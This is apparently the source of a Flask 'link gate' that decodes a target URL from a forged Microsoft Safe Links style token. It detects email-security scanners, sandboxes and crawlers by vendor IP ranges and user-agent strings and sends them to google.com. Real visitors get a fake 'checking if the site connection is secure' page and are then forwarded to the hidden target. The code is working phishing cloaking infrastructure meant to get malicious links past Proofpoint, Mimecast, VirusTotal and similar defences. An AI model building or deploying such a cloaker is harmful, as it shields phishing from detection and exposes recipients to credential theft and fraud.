import os
import time
import json
import secrets
import string
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl, quote

import httpx
from flask import (
    Flask, request, redirect, render_template_string,
    abort, make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY")
if not SK:
    raise RuntimeError("SECRET_KEY env var required")
if len(SK) < 32:
    raise RuntimeError("SECRET_KEY must be >= 32 chars")

GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")

app = Flask(__name__)
app.secret_key = SK.encode()
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ... [Keep your SCANNER_NETS and SCANNER_UA_TOKENS exactly as they were] ...
EOP = [ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"), ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"), ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"), ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20")]
PROOFPOINT = [ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"), ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"), ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"), ip_network("62.128.218.0/23"), ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20")]
MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]

SCANNER_NETS = {
    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST, "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")], "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")], "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")], "cloudflare_email": [ip_network("104.30.0.0/18")], "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")], "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
}
SCANNER_UA_TOKENS = ("microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", "mimecast", "barracuda", "talos", "ironport", "forcepoint", "symantec", "messagelabs", "trendmicro", "trend micro", "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security", "avanan", "ironscales", "cloudmark", "agari", "valimail", "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade", "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis", "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching", "intezer", "cape sandbox", "reverse.it", "filescan.io", "googlebot", "google-safety", "bingpreview", "bingbot", "duckduckbot", "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit", "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview", "applebot", "pinterestbot", "embedly", "quora link preview", "outbrain", "nuzzel", "vk share", "w3c_validator", "curl/", "wget/", "python-requests", "python-urllib", "go-http-client", "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl", "masscan", "nmap", "zgrab", "nuclei", "nikto", "sqlmap", "headlesschrome", "phantomjs", "puppeteer", "playwright", "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot", "statuscake", "site24x7", "newrelic", "datadog synthetics")

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    low = ua.lower()
    try:
        a = ip_address(ip)
    except ValueError:
        a = None
    if a is not None:
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip"
                break
    if not out["scanner"]:
        for tok in SCANNER_UA_TOKENS:
            if tok in low:
                out["scanner"] = True
                out["source"] = tok
                out["method"] = "ua"
                break
    return out

# --- Helper to extract the target URL from the Fake EOP token ---
def parse_target_from_eop(eop_string):
    if not eop_string.startswith("u001."):
        return None
    try:
        # Remove prefix and hex encodings
        clean = eop_string[5:].replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
        # The last part of the string is the base64 URL (separated by a hyphen)
        parts = clean.split("-")
        if len(parts) < 2:
            return None
        b64_target = parts[-1]
        
        # Pad the base64 string
        padding = '=' * (-len(b64_target) % 4)
        decoded = base64.urlsafe_b64decode(b64_target + padding).decode('utf-8')
        
        if decoded.startswith(("http://", "https://")):
            return decoded
    except Exception:
        pass
    return None

def _valid_http_url(u: str) -> bool:
    return isinstance(u, str) and u.startswith(("http://", "https://"))

def _apply_unified_headers(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"

def _static_page(title: str, text: str, status_code: int):
    html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
    <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
    .c{{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.05);text-align:center;max-width:400px}}</style>
    </head><body><div class="c"><h1>{title}</h1><p>{text}</p></div></body></html>"""
    resp = make_response(html, status_code)
    _apply_unified_headers(resp)
    return resp

LANDING = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<title>Just a moment...</title>
<style>
  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9;padding:1rem}
  .card{background:#fff;padding:2rem 2.5rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:440px;width:100%;text-align:center;box-sizing:border-box}
  h1{font-size:1.25rem;margin:0 0 1rem;color:#111;font-weight:600}
  p{color:#444;margin:0 0 1.5rem;line-height:1.5;font-size:.95rem}
  button{background:#0b5fff;color:#fff;border:0;padding:.8rem 1.6rem;border-radius:8px;font-size:1rem;cursor:pointer;width:100%}
  button:hover{background:#0847c4}
</style>
</head>
<body>
  <form class="card" method="POST" action="{{ action }}" autocomplete="off">
    <h1>Just a moment...</h1>
    <p>Please stand by, while we are checking if the site connection is secure.</p>
    <input type="hidden" name="t" value="{{ token }}">
    <button type="submit">Continue</button>
  </form>
</body>
</html>"""

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time())})

@app.route("/", methods=["GET"])
def root():
    return _static_page("Not found", "Nothing here.", 404)

# --- The Route expects the full 'click_upn=...' in the path ---
@app.route("/ls/<path:token>", methods=["GET"])
def landing(token: str):
    # The token will be "click_upn=u001.4jD73..."
    if not token.startswith("click_upn="):
        return _static_page("Invalid link", "This link is not valid.", 404)
        
    eop_token = token.replace("click_upn=", "")
    target = parse_target_from_eop(eop_token)
    
    if not target:
        return _static_page("Invalid link", "This link is not valid.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    log.info(json.dumps({"event": "landing_get", **tag, "token": eop_token[:12]}))

    if tag["scanner"]:
        log.info(json.dumps({"event": "landing_scanner_redirect", **tag}))
        return redirect(UNWANTED_REDIRECT_URL, code=302)

    nonce_payload = {"t": eop_token, "n": secrets.token_urlsafe(16), "ts": time.time()}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(
        LANDING,
        action=f"/submit/{quote(eop_token)}",
        token=eop_token
    )

    resp = make_response(html)
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    _apply_unified_headers(resp)
    return resp

@app.route("/submit/<path:token>", methods=["POST"])
def execute(token: str):
    tag = classify(client_ip(), request.headers.get("User-Agent", ""))

    if tag["scanner"]:
        return redirect(UNWANTED_REDIRECT_URL, code=302)

    submitted_blob = request.form.get("n", "")
    if not submitted_blob:
        return _static_page("Missing Context", "Verification payload missing.", 400)

    try:
        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
    except (SignatureExpired, BadSignature):
        return _static_page("Session Expired", "Verification context expired.", 400)

    if not secrets.compare_digest(nonce_data.get("t", ""), token):
        return _static_page("Verification Failed", "Verification payload mismatched.", 400)

    target = parse_target_from_eop(token)
    if not target:
         return _static_page("Invalid link", "Could not parse target.", 404)

    resp = make_response(redirect(target, code=303))
    resp.delete_cookie("gate_session", path="/")
    _apply_unified_headers(resp)
    return resp

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
